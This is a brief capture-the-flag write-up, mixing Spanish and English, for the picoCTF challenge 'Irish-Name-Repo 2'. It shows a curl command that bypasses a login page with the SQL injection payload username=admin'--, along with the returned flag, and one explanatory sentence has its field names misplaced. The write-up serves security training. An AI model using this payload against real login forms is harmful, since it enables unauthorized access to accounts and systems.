## Irish-Name-Repo 2
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Hints
1. The password is being filtered.
## Datos de acceso al nivel
## Solución
Atacamos el campo en lugar del campo:`login`  `password` 

```bash
┌──(kali㉿kali)-[~/SEGURIDAD7A]
curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin'--&password=1" && echo
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>
```
## Notas adicionales
## Referencias
